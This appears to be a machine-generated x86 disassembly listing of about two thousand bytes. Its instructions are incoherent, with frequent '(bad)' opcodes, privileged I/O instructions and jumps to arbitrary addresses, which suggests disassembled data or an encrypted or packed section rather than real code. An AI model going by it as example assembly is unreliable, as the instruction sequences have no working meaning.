  40effa:	fnsave [ecx-0x74b88d50]
  40f000:	fnstsw WORD PTR [ecx]
  40f002:	int    0x88
  40f004:	cwde   
  40f005:	scas   al,BYTE PTR es:[edi]
  40f006:	jecxz  0x40f063
  40f008:	mov    ds:0xd21fcea7,al
  40f00d:	xchg   edi,eax
  40f00e:	bnd jmp 0x40efa9
  40f011:	push   ecx
  40f012:	scas   al,BYTE PTR es:[edi]
  40f013:	or     ah,bh
  40f015:	hlt    
  40f016:	out    0xec,eax
  40f018:	fbld   TBYTE PTR [edi-0x1f]
  40f01b:	stos   BYTE PTR es:[edi],al
  40f01c:	(bad)
  40f01f:	xchg   ecx,eax
  40f020:	dec    DWORD PTR [eax-0x5e]
  40f023:	inc    ebx
  40f024:	out    0x16,eax
  40f026:	add    BYTE PTR [ebp-0x54],ah
  40f029:	mov    dl,0xdc
  40f02b:	push   edx
  40f02c:	test   BYTE PTR [edi+0x38],bl
  40f02f:	adc    BYTE PTR [ecx+0x28927d52],bh
  40f035:	loopne 0x40f061
  40f037:	push   ecx
  40f038:	mov    cl,0x1e
  40f03a:	fwait
  40f03b:	pop    ebp
  40f03c:	dec    ecx
  40f03d:	addr16 xchg edx,eax
  40f03f:	sub    eax,edx
  40f041:	lods   al,BYTE PTR ds:[esi]
  40f042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f043:	push   ss
  40f044:	call   0x96e7348f
  40f049:	xchg   ebx,eax
  40f04a:	jb     0x40f059
  40f04c:	pop    ebx
  40f04d:	cmp    DWORD PTR [ebp+0x3cf55362],edi
  40f053:	scas   eax,DWORD PTR es:[edi]
  40f054:	cld    
  40f055:	inc    edx
  40f056:	push   0xffffffd3
  40f058:	pop    ss
  40f059:	pop    eax
  40f05a:	xchg   ecx,eax
  40f05b:	in     eax,0xd1
  40f05d:	and    BYTE PTR [edi],ch
  40f05f:	sbb    esi,DWORD PTR [eax]
  40f061:	jns    0x40f0c4
  40f063:	lea    edi,[ebx+0x7ef012a4]
  40f069:	cmp    al,0xa8
  40f06b:	(bad)  [ebx-0x491620a4]
  40f071:	add    BYTE PTR [ebp-0x4c],dl
  40f074:	cdq    
  40f075:	adc    al,0xe8
  40f077:	xchg   esi,eax
  40f078:	retf   0x5557
  40f07b:	test   BYTE PTR [edx-0x2f],cl
  40f07e:	int3   
  40f07f:	scas   eax,DWORD PTR es:[edi]
  40f080:	mov    cl,0x1
  40f082:	xor    edi,DWORD PTR [ebp+eax*1+0x78]
  40f086:	repz push eax
  40f088:	mov    dl,0xf4
  40f08a:	lods   al,BYTE PTR ds:[esi]
  40f08b:	mov    ecx,0x58d9b744
  40f090:	adc    eax,0x849d4eeb
  40f095:	jle    0x40f0a3
  40f097:	mov    bh,0x8a
  40f099:	es sti 
  40f09b:	das    
  40f09c:	not    DWORD PTR [esi-0x447b670a]
  40f0a2:	test   eax,0xb224de1c
  40f0a7:	mov    esp,0xd8e4e326
  40f0ac:	fld    QWORD PTR [ecx+0x5c874fd8]
  40f0b2:	loop   0x40f122
  40f0b4:	pop    ebp
  40f0b5:	lock sub BYTE PTR [edx],dl
  40f0b8:	dec    edi
  40f0b9:	nop
  40f0ba:	mov    ch,0xb9
  40f0bc:	fbld   TBYTE PTR [ecx+0x53]
  40f0bf:	leave  
  40f0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0c1:	not    BYTE PTR [edx+eax*2-0x6d7e9d60]
  40f0c8:	lahf   
  40f0c9:	or     eax,0x1e9fe6d3
  40f0ce:	sub    ch,bh
  40f0d0:	(bad)  
  40f0d1:	stc    
  40f0d2:	ja     0x40f12a
  40f0d4:	mov    cl,0xde
  40f0d6:	mov    edx,0x722c06c6
  40f0db:	sbb    eax,0xdb07bfee
  40f0e0:	mov    edi,ecx
  40f0e2:	push   eax
  40f0e3:	fidivr WORD PTR [ecx]
  40f0e5:	std    
  40f0e6:	shl    dh,cl
  40f0e8:	dec    ebx
  40f0e9:	test   eax,0x1155ff97
  40f0ee:	(bad)  
  40f0ef:	imul   DWORD PTR ds:0x7660c590
  40f0f5:	aad    0xd
  40f0f7:	aaa    
  40f0f8:	dec    ecx
  40f0f9:	jb     0x40f107
  40f0fb:	in     al,dx
  40f0fc:	int    0xa8
  40f0fe:	xchg   ebp,eax
  40f0ff:	imul   edi,eax,0x7a56e50a
  40f105:	push   ebx
  40f106:	retf   
  40f107:	pop    es
  40f108:	pop    eax
  40f109:	test   eax,0x258ba59c
  40f10e:	(bad)  
  40f10f:	ficomp WORD PTR [ebx-0x61039a80]
  40f115:	pop    ebp
  40f116:	inc    esp
  40f117:	idiv   BYTE PTR [ebx]
  40f119:	jo     0x40f14b
  40f11b:	xchg   BYTE PTR [eax],bl
  40f11d:	mov    ds:0x5dc27bfe,al
  40f122:	lahf   
  40f123:	push   esi
  40f124:	out    0xf2,eax
  40f126:	ror    BYTE PTR [eax+0x67aac802],cl
  40f12c:	mov    ebp,0x5cad301e
  40f131:	cmp    DWORD PTR [edi-0x1da089bd],edi
  40f137:	push   DWORD PTR [eax+0x46]
  40f13a:	retf   0x34c8
  40f13d:	and    eax,0x531c9d0b
  40f142:	popa   
  40f143:	test   WORD PTR [eax+0x12e5a74d],di
  40f14a:	and    DWORD PTR [ebp+0x16],ebx
  40f14d:	icebp  
  40f14e:	mov    ebx,0x4e5fedcf
  40f153:	jle    0x40f0f7
  40f155:	mov    bh,0x3e
  40f157:	and    dh,BYTE PTR [ebp+0x50]
  40f15a:	dec    ebp
  40f15b:	into   
  40f15c:	sbb    cl,BYTE PTR [eax-0x41b44d84]
  40f162:	mov    ecx,0x12697113
  40f167:	imul   ecx,DWORD PTR [eax+ecx*8+0x1bd6a4b1],0x5e
  40f16f:	in     eax,dx
  40f170:	fadd   st,st(3)
  40f172:	adc    al,0x58
  40f174:	pop    esi
  40f175:	fist   WORD PTR [esi]
  40f177:	sub    ebp,DWORD PTR [edi]
  40f179:	ins    DWORD PTR es:[edi],dx
  40f17a:	pop    es
  40f17b:	cmp    eax,0xeafa5336
  40f180:	icebp  
  40f181:	adc    eax,0x741752e4
  40f186:	shl    BYTE PTR ds:0xc9198b1b,1
  40f18c:	data16 xor BYTE PTR ds:0xd98af4a1,0x43
  40f194:	out    dx,al
  40f195:	add    dl,BYTE PTR [esi]
  40f197:	aam    0xaf
  40f199:	popf   
  40f19a:	jo     0x40f160
  40f19c:	loopne 0x40f19d
  40f19e:	loopne 0x40f1f4
  40f1a0:	lods   al,BYTE PTR ds:[esi]
  40f1a1:	jne    0x40f137
  40f1a3:	mov    bl,0x32
  40f1a5:	ss out 0x8d,eax
  40f1a8:	jp     0x40f1d9
  40f1aa:	call   0xb7fcfd4c
  40f1af:	xchg   edx,eax
  40f1b0:	cs mov edi,0xe6df57f0
  40f1b6:	mov    cl,0x98
  40f1b8:	cli    
  40f1b9:	push   es
  40f1ba:	or     DWORD PTR [ebp+0x134da58e],0x2e
  40f1c1:	fistp  QWORD PTR [ecx+0x1c]
  40f1c4:	inc    ebx
  40f1c5:	ror    BYTE PTR [ebx],0x77
  40f1c8:	cld    
  40f1c9:	test   DWORD PTR [edx-0x6b1ba77d],edi
  40f1cf:	xor    DWORD PTR [ecx],0x86d478a9
  40f1d5:	aad    0xbe
  40f1d7:	ss or  eax,0x31d6ca36
  40f1dd:	sub    DWORD PTR [ebp-0x1a],0xc752c80d
  40f1e4:	add    al,0x47
  40f1e6:	jg     0x40f195
  40f1e8:	shl    BYTE PTR [ebx+eax*4],1
  40f1eb:	inc    BYTE PTR [ecx]
  40f1ed:	test   edx,ebp
  40f1ef:	ds push eax
  40f1f1:	cmp    edx,DWORD PTR [eax]
  40f1f3:	inc    edx
  40f1f4:	adc    al,bh
  40f1f6:	es int3 
  40f1f8:	out    dx,al
  40f1f9:	mov    cl,0xbc
  40f1fb:	cwde   
  40f1fc:	or     eax,0xe5a2acb2
  40f201:	mov    dh,0x24
  40f203:	inc    ecx
  40f204:	pusha  
  40f205:	data16 mov ch,0xb9
  40f208:	data16 xor BYTE PTR [ebx],ah
  40f20b:	int    0x4d
  40f20d:	rcr    DWORD PTR ds:0xc6404487,0x39
  40f214:	push   0xb5548369
  40f219:	inc    DWORD PTR [edx*2+0x51daa76f]
  40f220:	pop    ecx
  40f221:	mov    ?,WORD PTR [esi-0x7]
  40f224:	xchg   ebx,eax
  40f225:	inc    ebx
  40f226:	dec    ecx
  40f227:	lahf   
  40f228:	sub    eax,0x8b4b6a9c
  40f22d:	xchg   ebx,eax
  40f22e:	push   ebp
  40f22f:	pop    esp
  40f230:	inc    ebp
  40f231:	scas   al,BYTE PTR es:[edi]
  40f232:	or     DWORD PTR [edx-0x4a1bca28],0xffffffeb
  40f239:	aas    
  40f23a:	push   ebx
  40f23b:	clc    
  40f23c:	cdq    
  40f23d:	push   esi
  40f23e:	cmc    
  40f23f:	push   ebp
  40f240:	js     0x40f23c
  40f242:	sbb    eax,0xf6734a33
  40f247:	cld    
  40f248:	sahf   
  40f249:	or     eax,0x788470dc
  40f24e:	cdq    
  40f24f:	push   ebp
  40f250:	pop    esi
  40f251:	cmp    BYTE PTR [ebx],cl
  40f253:	and    al,0xc6
  40f255:	sub    DWORD PTR [edx],edi
  40f257:	aad    0x7d
  40f259:	fcmove st,st(1)
  40f25b:	cmp    DWORD PTR [esi+0x5be3f68a],ecx
  40f261:	std    
  40f262:	aam    0x0
  40f264:	loop   0x40f2cc
  40f266:	imul   esp,edi,0xffffffc6
  40f269:	rcr    dh,1
  40f26b:	lods   al,BYTE PTR ss:[esi]
  40f26d:	pop    ss
  40f26e:	in     al,dx
  40f26f:	sbb    ebx,DWORD PTR [ebp+0x64]
  40f272:	scas   eax,DWORD PTR es:[edi]
  40f273:	xchg   ebp,eax
  40f274:	mov    cl,0x64
  40f276:	dec    esi
  40f277:	sub    esp,DWORD PTR [ecx-0x517cc95c]
  40f27d:	mov    esp,0x4819548c
  40f282:	push   edx
  40f283:	pop    ebx
  40f284:	es loop 0x40f2e6
  40f287:	cmp    ecx,ebp
  40f289:	(bad)  
  40f28a:	push   ss
  40f28b:	bnd jo 0x40f23e
  40f28e:	scas   al,BYTE PTR es:[edi]
  40f28f:	or     DWORD PTR [esi+eax*1-0x2584baf2],ecx
  40f296:	and    eax,0x212213c2
  40f29b:	mov    al,0xa7
  40f29d:	or     edi,esp
  40f29f:	mov    WORD PTR [ecx-0x29],gs
  40f2a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2a3:	fs pop es
  40f2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a6:	adc    DWORD PTR [ecx],eax
  40f2a8:	or     esp,DWORD PTR [ecx+0x10]
  40f2ab:	add    esp,DWORD PTR [ebx+0x6e5f8877]
  40f2b1:	add    bl,ch
  40f2b3:	mov    dh,0x10
  40f2b5:	jge    0x40f292
  40f2b7:	push   ecx
  40f2b8:	gs div dl
  40f2bb:	xor    ah,BYTE PTR [esi+0x54]
  40f2be:	fs inc ax
  40f2c1:	adc    dl,al
  40f2c3:	std    
  40f2c4:	ins    DWORD PTR es:[edi],dx
  40f2c5:	retf   0xfcf4
  40f2c8:	mov    al,ds:0x8a3b7adc
  40f2cd:	dec    eax
  40f2ce:	mov    ah,0x4e
  40f2d0:	sahf   
  40f2d1:	xor    eax,0x4289ddf8
  40f2d6:	shl    BYTE PTR [ebx+0x10],0x72
  40f2da:	adc    esp,eax
  40f2dc:	xor    al,0x2e
  40f2de:	call   0x5891e7cc
  40f2e3:	imul   ecx,DWORD PTR [edx-0x61],0x65
  40f2e7:	sbb    cl,cl
  40f2e9:	xor    bl,BYTE PTR [eax]
  40f2eb:	aaa    
  40f2ec:	das    
  40f2ed:	jne    0x40f303
  40f2ef:	ss out dx,eax
  40f2f1:	idiv   ebx
  40f2f3:	(bad)  
  40f2f5:	fs jmp 0x432f:0x6c54b855
  40f2fd:	pusha  
  40f2fe:	xor    DWORD PTR [edx],ecx
  40f300:	mov    cl,0x95
  40f302:	aam    0x42
  40f304:	sbb    al,0x51
  40f306:	adc    ah,bl
  40f308:	leave  
  40f309:	adc    al,0xe1
  40f30b:	adc    ch,ah
  40f30d:	adc    eax,0xfc379b8c
  40f312:	out    dx,al
  40f313:	cmp    al,0x9d
  40f315:	aas    
  40f316:	mov    edx,?
  40f318:	fiadd  DWORD PTR [edi]
  40f31a:	mov    edx,0x5190e608
  40f31f:	push   ecx
  40f320:	call   0x7d18:0xb3935576
  40f327:	and    BYTE PTR [edi],0x66
  40f32a:	loopne 0x40f37a
  40f32c:	mov    WORD PTR [eax+0x27],?
  40f32f:	inc    edx
  40f330:	xor    DWORD PTR [ebx],0xffffffe8
  40f333:	fst    QWORD PTR [ecx]
  40f335:	jle    0x40f3a4
  40f337:	outs   dx,DWORD PTR ds:[esi]
  40f338:	push   esi
  40f339:	jbe    0x40f317
  40f33b:	mov    esi,DWORD PTR [ecx+eiz*8+0x639d1221]
  40f342:	ins    DWORD PTR es:[edi],dx
  40f343:	pop    es
  40f344:	(bad)  
  40f345:	jmp    0x40f2d6
  40f347:	xchg   BYTE PTR [edx-0x2e],cl
  40f34a:	fild   WORD PTR [eax+0x69]
  40f34d:	pop    ecx
  40f34e:	or     al,0x6a
  40f350:	rcr    ebp,cl
  40f352:	xor    BYTE PTR [edi-0xc5cc2e3],dl
  40f358:	push   ss
  40f359:	shl    BYTE PTR [esi+0x15],0x9f
  40f35d:	dec    esp
  40f35e:	cmp    BYTE PTR [eax-0x220282c],dh
  40f364:	or     al,0x59
  40f366:	mov    al,0xb6
  40f368:	dec    esp
  40f369:	mov    dl,0x4e
  40f36b:	aaa    
  40f36c:	sar    BYTE PTR [esi-0x31],1
  40f36f:	xor    BYTE PTR [edx+ebp*1-0x14],ch
  40f373:	add    al,0xe9
  40f375:	adc    DWORD PTR [eax],ebp
  40f377:	xor    eax,0xe414ca94
  40f37c:	or     DWORD PTR [edx+0x7b],0x366aba1d
  40f383:	test   al,0x17
  40f385:	stos   DWORD PTR es:[edi],eax
  40f386:	test   BYTE PTR [ecx+0x24e525fa],dh
  40f38c:	shl    DWORD PTR [ebx-0x14d680f3],1
  40f392:	loop   0x40f3a9
  40f394:	int3   
  40f395:	cld    
  40f396:	out    dx,al
  40f397:	and    eax,0xbaaca2c5
  40f39c:	push   ds
  40f39d:	jmp    0x358769f0
  40f3a2:	test   eax,0xed342457
  40f3a7:	pop    eax
  40f3a8:	or     ebx,DWORD PTR [edi]
  40f3aa:	(bad)  
  40f3ab:	jns    0x40f399
  40f3ad:	mov    dh,0x48
  40f3af:	repz call 0xfec25a88
  40f3b5:	iret   
  40f3b6:	or     BYTE PTR [edx+0x13],al
  40f3b9:	jp     0x40f3d3
  40f3bb:	fdivrp st(7),st
  40f3bd:	fmul   st(4),st
  40f3bf:	scas   al,BYTE PTR es:[edi]
  40f3c0:	lods   al,BYTE PTR ds:[esi]
  40f3c1:	inc    ebx
  40f3c2:	xchg   edi,ebx
  40f3c4:	dec    ecx
  40f3c5:	int    0x89
  40f3c7:	nop
  40f3c8:	popf   
  40f3c9:	mov    ah,0xc
  40f3cb:	xchg   ecx,eax
  40f3cc:	jmp    0xd8a5db21
  40f3d1:	sub    bh,BYTE PTR [eax+0x3]
  40f3d4:	aaa    
  40f3d5:	adc    WORD PTR [esi+0x2179c3ce],sp
  40f3dc:	push   edx
  40f3dd:	fdiv   QWORD PTR [ebx+eiz*4]
  40f3e0:	sbb    ch,BYTE PTR [esi-0x61fe07f7]
  40f3e6:	jmp    0xe6c46c55
  40f3eb:	or     edi,DWORD PTR [ebp-0x14]
  40f3ee:	mul    DWORD PTR [ebx+0x2d]
  40f3f1:	lods   eax,DWORD PTR ds:[esi]
  40f3f2:	(bad)  
  40f3f3:	int3   
  40f3f4:	cmp    bh,BYTE PTR [eax+0x30cd50f4]
  40f3fa:	jl     0x40f3e3
  40f3fc:	popa   
  40f3fd:	push   ebx
  40f3fe:	int3   
  40f3ff:	mov    dh,0x3e
  40f401:	rcr    BYTE PTR [esi-0x58],1
  40f404:	push   ebp
  40f405:	in     eax,dx
  40f406:	cmc    
  40f407:	or     dl,BYTE PTR [ecx+0x41]
  40f40a:	lds    edx,FWORD PTR [edi+0x19e36b7c]
  40f410:	mov    ebp,0xc5e52dd0
  40f415:	mov    WORD PTR [ecx+0x62],ds
  40f418:	xor    BYTE PTR [edx-0x32],bh
  40f41b:	xchg   BYTE PTR [eax+0xdf8d4bf],dl
  40f421:	xor    eax,0x225e364b
  40f426:	sti    
  40f427:	clc    
  40f428:	inc    esp
  40f429:	icebp  
  40f42a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f42b:	add    eax,0xafd99545
  40f430:	jo     0x40f447
  40f432:	mov    ecx,0xa5f45245
  40f437:	(bad)  
  40f438:	sub    ebx,DWORD PTR [edi+0x772e45af]
  40f43e:	push   edi
  40f43f:	inc    esi
  40f440:	mov    ds:0x85d25f59,eax
  40f445:	jmp    0xd2b8:0xde375046
  40f44c:	inc    esi
  40f44d:	pop    ebx
  40f44e:	out    0x96,eax
  40f450:	cmp    ebp,DWORD PTR [edi-0x67]
  40f453:	stc    
  40f454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f455:	mov    eax,0x601c9f6c
  40f45a:	push   cs
  40f45b:	or     BYTE PTR [eax],bh
  40f45d:	and    eax,0x9275a5aa
  40f462:	pop    es
  40f463:	cmc    
  40f464:	xchg   esp,eax
  40f465:	inc    edx
  40f466:	jne    0x40f42b
  40f468:	js     0x40f44c
  40f46a:	arpl   WORD PTR [ebx+0x22],cx
  40f46d:	mov    DWORD PTR [eax+0x14],esi
  40f470:	and    eax,0x89c43d89
  40f475:	add    BYTE PTR [ecx],0xfa
  40f478:	fdivr  DWORD PTR [edx+ebp*1+0x7039e5af]
  40f47f:	scas   eax,DWORD PTR es:[edi]
  40f480:	mov    eax,DWORD PTR [eax-0x333adf89]
  40f486:	cmp    dl,BYTE PTR [ebx+0x4b33a90c]
  40f48c:	and    al,0x69
  40f48e:	push   0xfffffff1
  40f490:	lock fadd DWORD PTR [esi+0x6724b85b]
  40f497:	or     BYTE PTR [ecx+0x19],dh
  40f49a:	push   ebp
  40f49b:	and    ecx,DWORD PTR [edi+0x2a14040d]
  40f4a1:	pop    eax
  40f4a2:	(bad)  
  40f4a3:	adc    al,0xb1
  40f4a5:	aam    0xb4
  40f4a7:	shl    BYTE PTR [ecx],1
  40f4a9:	xchg   edi,eax
  40f4aa:	out    dx,eax
  40f4ab:	xor    BYTE PTR [eax+0x24ac2e3c],0xf1
  40f4b2:	add    cl,BYTE PTR [ebx]
  40f4b4:	add    edx,edx
  40f4b6:	dec    ebx
  40f4b7:	outs   dx,DWORD PTR ds:[esi]
  40f4b8:	push   cs
  40f4b9:	jbe    0x40f490
  40f4bb:	adc    al,0xbe
  40f4bd:	mov    bh,0xbd
  40f4bf:	rol    bh,1
  40f4c1:	lea    ebx,[ebp+0x69fcba5e]
  40f4c7:	(bad)  
  40f4c8:	dec    esp
  40f4c9:	push   esp
  40f4ca:	xchg   edx,eax
  40f4cb:	mov    esp,0x4d56da6
  40f4d0:	xchg   esi,eax
  40f4d1:	aad    0x9c
  40f4d3:	mov    al,ds:0x3717f96c
  40f4d8:	inc    ebx
  40f4d9:	std    
  40f4da:	bound  esp,QWORD PTR [ebx+0x59]
  40f4dd:	jge    0x40f48b
  40f4df:	jle    0x40f551
  40f4e1:	pop    es
  40f4e2:	leave  
  40f4e3:	ret    
  40f4e4:	push   ss
  40f4e5:	mov    ah,0x3d
  40f4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e8:	xor    cl,ah
  40f4ea:	(bad)  
  40f4eb:	fiadd  WORD PTR [esi-0x79]
  40f4ee:	loop   0x40f4b4
  40f4f0:	xlat   BYTE PTR ds:[ebx]
  40f4f1:	adc    al,0xe0
  40f4f3:	jp     0x40f54d
  40f4f5:	mov    al,ds:0x31925484
  40f4fa:	jl     0x40f55d
  40f4fc:	leave  
  40f4fd:	add    DWORD PTR [eax+ecx*2-0x6d39d2cd],ebp
  40f504:	dec    esp
  40f505:	inc    edi
  40f506:	push   ds
  40f507:	lahf   
  40f508:	or     ebp,ebx
  40f50a:	lds    ecx,FWORD PTR [eax]
  40f50c:	leave  
  40f50d:	out    0xe0,eax
  40f50f:	test   al,0x38
  40f511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f512:	fs adc eax,0x55d578f9
  40f518:	cwde   
  40f519:	sbb    DWORD PTR [ebx],edx
  40f51b:	cmc    
  40f51c:	jmp    0x40f544
  40f51e:	dec    esi
  40f51f:	sub    al,0xb1
  40f521:	test   al,0x2a
  40f523:	clc    
  40f524:	pusha  
  40f525:	cs add eax,0x9a2ba1ae
  40f52b:	xchg   edx,eax
  40f52c:	das    
  40f52d:	and    BYTE PTR [edx+0x36886d31],ah
  40f533:	and    eax,0xba0382bd
  40f538:	pop    ebx
  40f539:	sbb    al,BYTE PTR [eax-0x4151051e]
  40f53f:	cli    
  40f540:	mov    esi,edx
  40f542:	enter  0x60e,0xf8
  40f546:	sub    al,BYTE PTR [eax+0x1874f20c]
  40f54c:	rcl    edi,1
  40f54e:	jp     0x40f50f
  40f550:	cmp    eax,0x1f6d75b9
  40f555:	inc    edx
  40f556:	ins    DWORD PTR es:[edi],dx
  40f557:	mov    dl,0xed
  40f559:	dec    ebp
  40f55a:	nop
  40f55b:	xor    esi,DWORD PTR ds:0xd5d28af3
  40f561:	std    
  40f562:	les    ebp,FWORD PTR [esi+0x23]
  40f565:	dec    esp
  40f566:	icebp  
  40f567:	mov    edx,0xebf8dae5
  40f56c:	mov    eax,ds:0x66141b0d
  40f571:	mov    bl,0x4b
  40f573:	fidivr WORD PTR [ecx+0x59]
  40f576:	icebp  
  40f577:	repz into 
  40f579:	jmp    0x40f5c0
  40f57b:	mov    cl,dh
  40f57d:	aad    0xe5
  40f57f:	imul   ebx,edi,0x93c9d98b
  40f585:	imul   DWORD PTR [edi]
  40f587:	pop    ebp
  40f588:	or     edx,DWORD PTR [ebx-0x1d4b2b1b]
  40f58e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f58f:	in     eax,dx
  40f590:	sub    dh,BYTE PTR [edx]
  40f592:	pop    ecx
  40f593:	mov    ebx,0x18304642
  40f598:	into   
  40f599:	xchg   DWORD PTR [edi+0x3320cebc],esp
  40f59f:	mov    dh,0xa7
  40f5a1:	ja     0x40f596
  40f5a3:	scas   al,BYTE PTR es:[edi]
  40f5a4:	loop   0x40f573
  40f5a6:	fnstcw WORD PTR [eax]
  40f5a8:	or     al,0x57
  40f5aa:	fcmovnu st,st(5)
  40f5ac:	outs   dx,DWORD PTR ds:[esi]
  40f5ad:	(bad)  
  40f5ae:	mov    DWORD PTR [edx+0x21],eax
  40f5b1:	sbb    BYTE PTR [edi],0xfa
  40f5b4:	loope  0x40f57d
  40f5b6:	jg     0x40f562
  40f5b8:	or     al,0x74
  40f5ba:	jecxz  0x40f61f
  40f5bc:	outs   dx,DWORD PTR ds:[esi]
  40f5bd:	push   edi
  40f5be:	inc    esi
  40f5bf:	in     eax,0x24
  40f5c1:	lgs    ebx,FWORD PTR [esi-0x60172dab]
  40f5c8:	out    0x64,eax
  40f5ca:	sub    DWORD PTR [ebp-0x7fe3cdd9],edx
  40f5d0:	cmp    DWORD PTR [ecx-0x165ed8d2],esi
  40f5d6:	fnstenv [eax+0x409b6759]
  40f5dc:	mov    eax,ds:0xf0acdf9
  40f5e1:	dec    edx
  40f5e2:	jg     0x40f5d6
  40f5e4:	and    BYTE PTR [edi],ch
  40f5e6:	mov    ds:0xaa5eccef,eax
  40f5eb:	jnp    0x40f65a
  40f5ed:	xchg   ebp,eax
  40f5ee:	pop    esi
  40f5ef:	es jns 0x40f5a9
  40f5f2:	mov    ds:0x3b57b4a8,eax
  40f5f7:	dec    ebx
  40f5f8:	daa    
  40f5f9:	and    ebp,ecx
  40f5fb:	adc    BYTE PTR [ecx-0x75a5de87],0x21
  40f602:	gs and ch,0x14
  40f606:	out    0xfd,al
  40f608:	cmp    al,0x62
  40f60a:	jle    0x40f629
  40f60c:	add    cl,dl
  40f60e:	sub    bh,BYTE PTR [edx-0x316e7902]
  40f614:	mov    eax,0x27f99d56
  40f619:	sbb    al,0x82
  40f61b:	repnz scas al,BYTE PTR es:[edi]
  40f61d:	fs and bh,bh
  40f620:	dec    ebp
  40f621:	je     0x40f5e8
  40f623:	nop
  40f624:	fild   DWORD PTR [ecx+ebp*2]
  40f627:	mov    al,0x8a
  40f629:	push   eax
  40f62a:	loopne 0x40f621
  40f62c:	xor    al,0xab
  40f62e:	int3   
  40f62f:	and    BYTE PTR [eax],dl
  40f631:	data16 and cl,dh
  40f634:	push   ecx
  40f635:	sti    
  40f636:	ins    DWORD PTR es:[edi],dx
  40f637:	inc    eax
  40f638:	cmc    
  40f639:	sub    eax,0x897404ef
  40f63e:	sahf   
  40f63f:	xchg   ebp,eax
  40f640:	pop    edx
  40f641:	mov    dl,0x62
  40f643:	test   DWORD PTR [ebx-0x442dff19],esp
  40f649:	cmp    dl,dh
  40f64b:	cmp    ebp,DWORD PTR [ecx-0x46]
  40f64e:	mov    ebx,0xe9708fa1
  40f653:	repz pop ecx
  40f655:	mov    esp,0x2668d950
  40f65a:	mov    ds:0x88c4e356,al
  40f65f:	push   0xffffffde
  40f661:	inc    eax
  40f662:	xor    eax,DWORD PTR [esi+0x761a4bcc]
  40f668:	in     eax,dx
  40f669:	sbb    DWORD PTR [esi],esi
  40f66b:	inc    ebx
  40f66c:	or     ebx,eax
  40f66e:	push   edi
  40f66f:	dec    esp
  40f670:	pop    ds
  40f671:	sub    ch,BYTE PTR [ecx+0x1b]
  40f674:	cwde   
  40f675:	mov    DWORD PTR [ebp+0x1971f4df],0x69eaebbc
  40f67f:	or     ecx,DWORD PTR [esi]
  40f681:	std    
  40f682:	ret    
  40f683:	cmp    al,BYTE PTR [edi+0x1846636c]
  40f689:	inc    esi
  40f68a:	test   al,0xaf
  40f68c:	sahf   
  40f68d:	or     al,0x67
  40f68f:	mov    ch,0x6b
  40f691:	shl    DWORD PTR [esi+0x5d],1
  40f694:	mov    dl,0xc7
  40f696:	je     0x40f6f2
  40f698:	les    ebx,FWORD PTR [ecx+0x31]
  40f69b:	pop    ss
  40f69c:	div    BYTE PTR [ecx+0x54e243c]
  40f6a2:	sbb    DWORD PTR [ecx],0xffffffb0
  40f6a5:	push   DWORD PTR [edi+0x68b76c6c]
  40f6ab:	sbb    DWORD PTR [eax],0xf330fdf3
  40f6b1:	ins    BYTE PTR es:[edi],dx
  40f6b2:	icebp  
  40f6b3:	dec    esi
  40f6b4:	test   eax,0x53c111c4
  40f6b9:	pop    esp
  40f6ba:	sbb    al,0x24
  40f6bc:	ret    
  40f6bd:	stos   DWORD PTR es:[edi],eax
  40f6be:	ffree  st(2)
  40f6c0:	mov    ebp,0xe33ac3be
  40f6c5:	jmp    0xeeb84a79
  40f6ca:	in     al,0x18
  40f6cc:	mov    ch,0x13
  40f6ce:	mov    ecx,DWORD PTR [ecx]
  40f6d0:	stos   BYTE PTR es:[edi],al
  40f6d1:	inc    esi
  40f6d2:	add    esi,esp
  40f6d4:	xchg   edx,eax
  40f6d5:	push   eax
  40f6d6:	xor    al,0x2d
  40f6d8:	dec    edi
  40f6d9:	mov    dh,dh
  40f6db:	dec    ecx
  40f6dc:	jge    0x40f6c8
  40f6de:	adc    al,0x7e
  40f6e0:	sub    DWORD PTR [edx+eax*8],0xf8fc4bf1
  40f6e7:	xchg   ebp,eax
  40f6e8:	mov    edx,0x3c9afdac
  40f6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ee:	pop    eax
  40f6ef:	jnp    0x40f72c
  40f6f1:	xor    al,BYTE PTR [esi-0x7]
  40f6f4:	lock loopne 0x40f6e5
  40f6f7:	dec    edx
  40f6f8:	dec    ebp
  40f6f9:	pop    edi
  40f6fa:	test   eax,0x39a37860
  40f6ff:	sub    DWORD PTR [esi+ecx*4-0x559541d2],0x5d
  40f707:	repnz jmp 0x8318:0xd2ee9458
  40f70f:	stos   DWORD PTR es:[edi],eax
  40f710:	stc    
  40f711:	and    eax,0x38567dd9
  40f716:	xor    al,0x29
  40f718:	add    DWORD PTR [ebp-0x1f],esp
  40f71b:	loop   0x40f78c
  40f71d:	ficomp WORD PTR [edx]
  40f71f:	fst    QWORD PTR [eax]
  40f721:	push   0xa8f63cd0
  40f726:	add    al,0x3c
  40f728:	mov    ebx,0x46c99e45
  40f72d:	pushf  
  40f72e:	jnp    0x40f7aa
  40f730:	sbb    DWORD PTR [esi+0xd],ecx
  40f733:	sub    DWORD PTR [esi+ebp*8-0x3f],esp
  40f737:	add    BYTE PTR [edi],dh
  40f739:	js     0x40f722
  40f73b:	xchg   edi,eax
  40f73c:	pop    edi
  40f73d:	xor    eax,0xbaec4272
  40f742:	xor    ebp,DWORD PTR [ebx+0x16c275a7]
  40f748:	and    esp,DWORD PTR [edx-0x22709cac]
  40f74e:	push   esp
  40f74f:	push   es
  40f750:	out    0xad,eax
  40f752:	push   eax
  40f753:	jnp    0x40f720
  40f755:	std    
  40f756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f757:	into   
  40f758:	retf   
  40f759:	xor    ecx,esp
  40f75b:	sbb    esp,esi
  40f75d:	adc    DWORD PTR [edx+0x7f],edx
  40f760:	mov    dh,0x46
  40f762:	or     BYTE PTR [esi+0x47],0x19
  40f766:	(bad)  
  40f768:	sbb    esi,ebx
  40f76a:	out    0xa1,eax
  40f76c:	or     edi,esp
  40f76e:	retf   
  40f76f:	inc    ecx
